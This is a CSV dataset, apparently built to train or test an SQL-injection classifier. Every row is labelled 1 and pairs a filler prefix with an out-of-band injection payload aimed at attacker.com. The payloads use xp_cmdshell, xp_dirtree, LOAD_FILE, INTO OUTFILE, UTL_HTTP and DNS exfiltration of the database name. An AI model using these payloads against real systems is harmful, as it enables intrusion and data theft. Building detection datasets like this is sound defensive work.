content,label
"page 功能 ' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"太精真阶万只并提' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"使用方法 ' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"物认党界进到积步打她次群住保' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"报按好百济四保照直发' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"数手可次人' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"error 986 ' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
功能 query ' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
多少钱 ' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
优势 ' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
功能 ' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
好不好 ' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
z9bzagm0g@' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
5379ap01c4wr@' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
民地才总领属矿劳'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
account 特点 '; EXEC('xp_cmdshell ''ping attacker.com''')--,1
7vca1p@'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
vn48jtitwuxi@'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
价走听断花许可养直选三北去山'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
所列建往采教两'; exec master..xp_fileexist '\\attacker.com\test'--,1
2024 '; exec master..xp_fileexist '\\attacker.com\test'--,1
怎么样 '; exec master..xp_fileexist '\\attacker.com\test'--,1
4cey5iwy@' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
table 437 ' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
vre8b3rgf86@' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
"按保只内处安度较平然务或资' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"info 对比 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"table 好不好 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"j319d48@' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"6l3x2gj6f7g2@' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
vpfs6c@'; exec master..xp_dirtree '\\attacker.com\share'--,1
功能 success 43 '; exec master..xp_dirtree '\\attacker.com\share'--,1
对比 '; exec master..xp_dirtree '\\attacker.com\share'--,1
济风方性成着组'; exec master..xp_dirtree '\\attacker.com\share'--,1
"哪里买 query ' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"哪里买 item ' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"使用方法 ' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"功能 ' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"广值日层眼力把清只分值但' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
须土与细速' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
开图支收式记片斗本写正种要文取' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
1vgqx@' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
"5g9uf3xzzx@' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"z80ovz@' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"query 好不好 ' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"教程 ' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"民南地安治' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"非为清大思心准价划层加热该现性' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"server 使用方法 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"0hm37tqcudww@' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"gsu313x7u@' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"打设位见比作有个段水' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"怎么样 user 79 ' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
"180enivmig1@' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
"中感水' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
她正选'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
f1031go@'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
怎么样 '; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
断二式造'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
什么是 login '; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
"教程 data 14 ' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"叫金道需马路义克些' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"m48al@' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"县酸住何他记毛音经' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"em4wov0z8@' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
和军切知做需很工克并' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
fdc43ujl@' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
如何 admin ' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
教程 ' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
空更连山统下气而品张从心很' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
哪里买 ' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
最新 ' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
对比 '; EXEC('xp_cmdshell ''ping attacker.com''')--,1
koqu9uplva@'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
do4pyhyvi@'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
nhi152a@'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
划按反叫世型根民'; exec master..xp_fileexist '\\attacker.com\test'--,1
page 416 '; exec master..xp_fileexist '\\attacker.com\test'--,1
功能 table '; exec master..xp_fileexist '\\attacker.com\test'--,1
排名 '; exec master..xp_fileexist '\\attacker.com\test'--,1
mr2h016abn@'; exec master..xp_fileexist '\\attacker.com\test'--,1
如何 ' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
xwflavcxrysw@' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
价格 item ' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
fd4zxri6q@' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
如何 login ' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
"最新 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"新清物话越属使起' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"价格 info ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"都率现会发其前' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
立量风级热外所带你易'; exec master..xp_dirtree '\\attacker.com\share'--,1
厂争规更始'; exec master..xp_dirtree '\\attacker.com\share'--,1
好不好 '; exec master..xp_dirtree '\\attacker.com\share'--,1
多少钱 setting '; exec master..xp_dirtree '\\attacker.com\share'--,1
"kbxvw8pq@' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"好不好 ' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"下载 ' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
profile 927 ' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
使用方法 test ' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
26os0c02@' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
哪里买 order ' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
多少钱 success ' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
"order 620 ' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"下载 order 13 ' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"29ibk1prg3@' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"6w3p5dwxxm4g@' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"korzo6@' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"推荐 fail ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"怎么样 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"评测 ' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
"排名 ' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
"哪里买 ' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
"setting 评测 ' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
最新 '; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
想正快根放结天布'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
优势 login 92 '; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
f2rxl0@'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
"vib3kezx3qni@' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"少局程法不没加' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"怎么样 database ' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"什么是 ' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"万消制与' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"odlharq6wb8@' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
最新 ' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
比造即物只听入精' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
o6qdlvo802zu@' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
3gnqbfy52p@' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
hbddn97r@' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
rz85x4h2b@' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
下载 item ' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
8ylsy@' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
月认离九'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
7d84n@'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
功能 server 25 '; exec master..xp_fileexist '\\attacker.com\test'--,1
zvvyf5ua@'; exec master..xp_fileexist '\\attacker.com\test'--,1
多少钱 '; exec master..xp_fileexist '\\attacker.com\test'--,1
y2i8kt@' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
对比 view 76 ' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
xvkt4z@' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
s9aghzid@' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
成派快住加亲边可真记而写易法' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
"接写系部级至争' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"e1ydk5zq@' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"j2v1j8vnbyx@' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
setting 525 '; exec master..xp_dirtree '\\attacker.com\share'--,1
对比 view '; exec master..xp_dirtree '\\attacker.com\share'--,1
zkszq607o@'; exec master..xp_dirtree '\\attacker.com\share'--,1
test 哪里买 '; exec master..xp_dirtree '\\attacker.com\share'--,1
"怎么样 product 77 ' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"search 教程 ' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"g4fmf@' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"全社切目需许合采族' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"sud094p@' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
程价务置究声三求县风的' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
view 价格 ' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
价格 setting ' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
"排名 setting ' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"优势 ' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"5rz8n0tlabj@' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"ooz7sdz8aa@' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"ruodksa@' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"data 667 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"8h6bkyk@' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
"式更业料青元切器经导少员' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
page 784 '; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
什么是 '; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
推荐 '; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
"价格 ' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"状较克下容精周备所对' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"还观石亲便展发易世结再在同林' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"哪里买 ' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"最新 ' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"保从别素准立行京集实结全' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"fail 排名 ' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"今素北法每就的计声南型别' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
排名 ' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
mofad@' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
研斯信持可转' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
评测 ' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
常质江定南更变统示及从往' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
得今价作构些的格' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
特点 ' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
说劳公百' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
行节油造风'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
rrqe7z5@'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
97aq4vn@'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
矿指意斗法严十'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
而光众'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
议七是政是号住识满才值'; exec master..xp_fileexist '\\attacker.com\test'--,1
推荐 '; exec master..xp_fileexist '\\attacker.com\test'--,1
setting 251 '; exec master..xp_fileexist '\\attacker.com\test'--,1
最新 ' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
database 如何 ' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
什么是 ' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
"产拉采见单' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"n9zrx05q@' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"2024 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
h5drpbtm@'; exec master..xp_dirtree '\\attacker.com\share'--,1
9rsufwsidej@'; exec master..xp_dirtree '\\attacker.com\share'--,1
"data 555 ' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"量上即省真革平压备务社今' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"争完单声族' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"login 优势 ' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"8h32mhd@' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
0uz79@' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
qzjokttw@' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
下载 ' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
技群国' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
ss2bjqcpany9@' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
"怎么样 admin 32 ' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"h5q4qlb0@' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"scsuajagx6@' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"9ah1p195i@' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"对比 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"bx4zjq4m1qqo@' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"2024 error ' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
"2024 database 56 ' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
"委果热断决新何指发组养各' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
s5f9yhg@'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
解方金月一军知复与拉新'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
多少钱 user '; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
农老使'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
"任它也内越之把构老' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"特点 ' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"始多定深在时圆满认么件在基重因' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"教程 ' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"哪里买 product ' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"server 619 ' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
术族者' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
7id9iaw85t@' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
7mjh0@' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
好不好 success ' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
soxmk4@' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
无话装都代主着便圆级' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
如何 login 50 ' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
术器增准证实复志多期成' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
适眼至就务'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
最新 warning '; EXEC('xp_cmdshell ''ping attacker.com''')--,1
特点 '; exec master..xp_fileexist '\\attacker.com\test'--,1
4t7s3otd@'; exec master..xp_fileexist '\\attacker.com\test'--,1
如何 admin '; exec master..xp_fileexist '\\attacker.com\test'--,1
test 140 '; exec master..xp_fileexist '\\attacker.com\test'--,1
2024 ' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
data 823 ' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
"jd7ed3txg8q@' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"意时共影' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"反把音业设适' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"评测 fail 90 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
vit92u@'; exec master..xp_dirtree '\\attacker.com\share'--,1
率公矿政然同太照表北持查'; exec master..xp_dirtree '\\attacker.com\share'--,1
评测 '; exec master..xp_dirtree '\\attacker.com\share'--,1
在影发么市'; exec master..xp_dirtree '\\attacker.com\share'--,1
"然二切人务海界拉' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"排名 ' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"warning 108 ' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"d1bcdmh@' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"7rmfak@' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
